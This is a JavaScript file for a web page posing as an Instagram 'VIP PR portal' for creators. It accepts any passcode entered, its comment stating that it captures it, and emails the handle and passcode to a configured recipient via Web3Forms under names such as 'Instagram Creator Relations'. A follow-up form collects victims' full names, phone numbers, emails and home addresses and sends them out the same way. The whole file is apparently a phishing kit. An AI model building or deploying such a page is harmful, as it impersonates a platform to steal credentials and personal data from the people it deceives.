// ==========================================================================
// Instagram Professional Light Theme - PR Portal Logic
// Official Palette: #833AB4, #C13584, #E1306C, #F77737, #FCAF45
// ==========================================================================

let authenticatedUser = null;
let authenticatedPasscode = null;
let loginTimestamp = null;
let submittedPRData = null;

document.addEventListener('DOMContentLoaded', () => {
  // Restore session if active
  const storedUser = sessionStorage.getItem('pr_auth_user');
  const storedPass = sessionStorage.getItem('pr_auth_pass');
  if (storedUser && storedPass) {
    authenticatedUser = storedUser;
    authenticatedPasscode = storedPass;
    showFormSection();
  }
});

/**
 * Handles Username & Passcode submission:
 * Accepts whatever passcode is entered, captures it, and dispatches notification.
 */
async function handleAuthSubmit(event) {
  event.preventDefault();

  const usernameInput = document.getElementById('dmUsername').value.trim().toLowerCase().replace(/^@/, '');
  const passcode = document.getElementById('dmPasscode').value.trim();
  const authBtn = document.getElementById('authBtn');

  if (!usernameInput || !passcode) {
    alert("Please provide both your Instagram handle and the passcode.");
    return;
  }

  // Store credentials
  authenticatedUser = usernameInput;
  authenticatedPasscode = passcode;
  loginTimestamp = new Date().toLocaleString();

  sessionStorage.setItem('pr_auth_user', authenticatedUser);
  sessionStorage.setItem('pr_auth_pass', authenticatedPasscode);
  sessionStorage.setItem('pr_auth_time', loginTimestamp);

  authBtn.innerHTML = '<span>Verifying & Connecting...</span>';
  authBtn.disabled = true;

  // Dispatch instant login notification
  sendInstantLoginNotification(authenticatedUser, authenticatedPasscode, loginTimestamp);

  // Trigger celebration
  triggerCelebration();

  setTimeout(() => {
    authBtn.innerHTML = '<span class="btn-text">Verify & Continue to PR Form</span>';
    authBtn.disabled = false;
    showFormSection();
  }, 600);
}

/**
 * Sends instant login alert with captured passcode
 */
async function sendInstantLoginNotification(username, passcode, timestamp) {
  console.log(`[LOGIN ALERT] Portal unlocked by @${username} with Passcode: "${passcode}" at ${timestamp}`);

  if (PR_CONFIG.web3FormsAccessKey && PR_CONFIG.web3FormsAccessKey !== "") {
    try {
      await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({
          access_key: PR_CONFIG.web3FormsAccessKey,
          subject: `[PORTAL ACCESS ALERT] @${username} logged in with Passcode: ${passcode}`,
          from_name: "Instagram PR Portal",
          to_email: PR_CONFIG.recipientEmail,
          message: `
VIP PR Portal Access Notification:

- Instagram Handle: @${username}
- Entered Passcode: ${passcode}
- Timestamp: ${timestamp}

Compare this passcode with what you sent in your Instagram DM to confirm identity.
`.trim()
        })
      });
    } catch (err) {
      console.warn("Could not dispatch login alert:", err);
    }
  }
}

/**
 * Transitions to Form Section
 */
function showFormSection() {
  document.getElementById('authSection').classList.add('hidden');
  document.getElementById('successSection').classList.add('hidden');
  
  const formSection = document.getElementById('formSection');
  formSection.classList.remove('hidden');

  const verifiedBadge = document.getElementById('verifiedUsername');
  if (verifiedBadge && authenticatedUser) {
    verifiedBadge.textContent = `@${authenticatedUser}`;
  }

  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/**
 * Locks the portal session
 */
function lockPortal() {
  sessionStorage.removeItem('pr_auth_user');
  sessionStorage.removeItem('pr_auth_pass');
  sessionStorage.removeItem('pr_auth_time');
  authenticatedUser = null;
  authenticatedPasscode = null;
  
  document.getElementById('formSection').classList.add('hidden');
  document.getElementById('successSection').classList.add('hidden');
  document.getElementById('authSection').classList.remove('hidden');
  document.getElementById('authForm').reset();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/**
 * Toggles password visibility with SVG icon switch
 */
function togglePasswordVisibility(inputId) {
  const input = document.getElementById(inputId);
  const btn = document.getElementById('togglePwBtn');
  
  if (input.type === 'password') {
    input.type = 'text';
    btn.innerHTML = `
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path>
        <path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path>
        <path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path>
        <line x1="2" x2="22" y1="2" y2="22"></line>
      </svg>
    `;
  } else {
    input.type = 'password';
    btn.innerHTML = `
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path>
        <circle cx="12" cy="12" r="3"></circle>
      </svg>
    `;
  }
}

/**
 * Handles Form Submission: collects all details and sends report
 */
async function handleDetailsSubmit(event) {
  event.preventDefault();

  const submitBtn = document.getElementById('submitDetailsBtn');
  const originalBtnContent = submitBtn.innerHTML;
  submitBtn.disabled = true;
  submitBtn.innerHTML = '<span>Processing & Dispatching Details...</span>';

  const formData = {
    creatorHandle: `@${authenticatedUser || 'unspecified'}`,
    enteredPasscode: authenticatedPasscode || sessionStorage.getItem('pr_auth_pass') || 'Not provided',
    loginTime: loginTimestamp || sessionStorage.getItem('pr_auth_time') || new Date().toLocaleString(),
    
    fullName: document.getElementById('fullName').value.trim(),
    preferredName: document.getElementById('preferredName').value.trim() || 'None',
    phone: document.getElementById('phone').value.trim(),
    email: document.getElementById('email').value.trim(),
    
    shipping: {
      streetAddress: document.getElementById('streetAddress').value.trim(),
      apartment: document.getElementById('apartment').value.trim() || 'None',
      city: document.getElementById('city').value.trim(),
      state: document.getElementById('state').value.trim(),
      zipCode: document.getElementById('zipCode').value.trim(),
      country: document.getElementById('country').value.trim(),
      deliveryInstructions: document.getElementById('deliveryInstructions').value.trim() || 'None'
    },
    
    preferences: {
      clothingSize: document.getElementById('clothingSize').value,
      shoeSize: document.getElementById('shoeSize').value.trim() || 'Not specified',
      aesthetic: document.getElementById('aesthetic').value.trim() || 'Open to recommendations',
      allergies: document.getElementById('allergies').value.trim() || 'None',
      unboxingTimeline: document.getElementById('unboxingTimeframe').value
    },
    submittedAt: new Date().toLocaleString()
  };

  submittedPRData = formData;
  localStorage.setItem('last_pr_submission', JSON.stringify(formData));

  // Send via Web3Forms if configured
  if (PR_CONFIG.web3FormsAccessKey && PR_CONFIG.web3FormsAccessKey !== "") {
    try {
      await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
        body: JSON.stringify({
          access_key: PR_CONFIG.web3FormsAccessKey,
          subject: `[PR SUBMISSION] ${formData.creatorHandle} (${formData.fullName}) | Passcode: ${formData.enteredPasscode}`,
          from_name: "Instagram Creator Relations",
          to_email: PR_CONFIG.recipientEmail,
          message: formatDetailsForEmail(formData)
        })
      });
    } catch (err) {
      console.warn("Web3Forms submission dispatch error:", err);
    }
  }

  prepareMailtoNotification(formData);
  triggerCelebration();

  setTimeout(() => {
    submitBtn.disabled = false;
    submitBtn.innerHTML = originalBtnContent;
    showSuccessSection(formData);
  }, 800);
}

/**
 * Format details for clean professional text output
 */
function formatDetailsForEmail(data) {
  return `
======================================================
INSTAGRAM CREATOR RELATIONS - VIP PR SUBMISSION
======================================================

AUTHENTICATION & VALIDATION:
- Instagram Handle: ${data.creatorHandle}
- Passcode Entered: [ ${data.enteredPasscode} ]
  (Compare this with the code sent in her Instagram DM)
- Portal Session Opened: ${data.loginTime}

CREATOR CONTACT INFORMATION:
- Full Name: ${data.fullName}
- Preferred Name: ${data.preferredName}
- Contact Phone: ${data.phone}
- Email: ${data.email}

SHIPPING & DELIVERY DESTINATION:
- Street Address: ${data.shipping.streetAddress}
- Apartment/Suite: ${data.shipping.apartment}
- City, State, ZIP: ${data.shipping.city}, ${data.shipping.state} ${data.shipping.zipCode}
- Country: ${data.shipping.country}
- Delivery Instructions: ${data.shipping.deliveryInstructions}

PACKAGE SPECIFICATIONS:
- Clothing Size: ${data.preferences.clothingSize}
- Shoe Size: ${data.preferences.shoeSize}
- Aesthetic / Palette: ${data.preferences.aesthetic}
- Allergies / Sensitivities: ${data.preferences.allergies}
- Review / Feature Timeline: ${data.preferences.unboxingTimeline}

Submission Timestamp: ${data.submittedAt}
======================================================
`.trim();
}

/**
 * Prepares mailto draft
 */
function prepareMailtoNotification(data) {
  const subject = encodeURIComponent(`VIP PR Submission - ${data.creatorHandle} (Passcode: ${data.enteredPasscode})`);
  const body = encodeURIComponent(formatDetailsForEmail(data));
  window.lastMailtoUrl = `mailto:${PR_CONFIG.recipientEmail}?subject=${subject}&body=${body}`;
}

/**
 * Success view
 */
function showSuccessSection(data) {
  document.getElementById('formSection').classList.add('hidden');
  const successSection = document.getElementById('successSection');
  successSection.classList.remove('hidden');

  document.getElementById('confirmRecipient').textContent = `${data.fullName} (${data.creatorHandle})`;
  document.getElementById('confirmDestination').textContent = `${data.shipping.city}, ${data.shipping.country}`;

  window.scrollTo({ top: 0, behavior: 'smooth' });
}

/**
 * Downloads receipt
 */
function downloadSummary() {
  if (!submittedPRData) {
    const cached = localStorage.getItem('last_pr_submission');
    if (cached) submittedPRData = JSON.parse(cached);
  }

  if (!submittedPRData) {
    alert("No submission details found to download.");
    return;
  }

  const content = formatDetailsForEmail(submittedPRData);
  const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const link = document.createElement('a');
  link.href = url;
  link.download = `PR_Details_${submittedPRData.creatorHandle.replace('@', '')}.txt`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
  URL.revokeObjectURL(url);
}

/**
 * Resets portal
 */
function resetPortal() {
  document.getElementById('successSection').classList.add('hidden');
  document.getElementById('prDetailsForm').reset();
  lockPortal();
}

/**
 * Celebration confetti strictly using the official Instagram gradient palette
 * Purple (#833AB4), Pink (#C13584), Red-Pink (#E1306C), Orange (#F77737), Gold (#FCAF45)
 */
function triggerCelebration() {
  if (typeof confetti === 'function') {
    confetti({
      particleCount: 80,
      spread: 60,
      origin: { y: 0.6 },
      colors: ['#833AB4', '#C13584', '#E1306C', '#F77737', '#FCAF45']
    });
  }
}
